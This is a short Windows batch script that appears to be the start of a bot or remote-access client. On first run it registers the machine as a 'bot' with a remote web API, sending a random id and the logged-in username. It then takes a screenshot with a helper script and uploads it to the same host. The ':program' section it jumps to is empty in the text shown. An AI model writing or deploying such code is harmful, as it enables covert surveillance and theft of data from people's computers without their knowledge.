@echo off
set second=0
if not exist id.log (

set id=%random%%random%
curl -X POST https://test-api-t78m.vercel.app/addBot/%id%  -d name="%username%"
echo %id%>id.log
echo echo command> command
cmd /C .\screen.bat shot.png
curl  https://test-api-t78m.vercel.app/updateShot/%id% -F testImage=@shot.png -F name="%username%"
goto program

) else (
goto program
)

:program

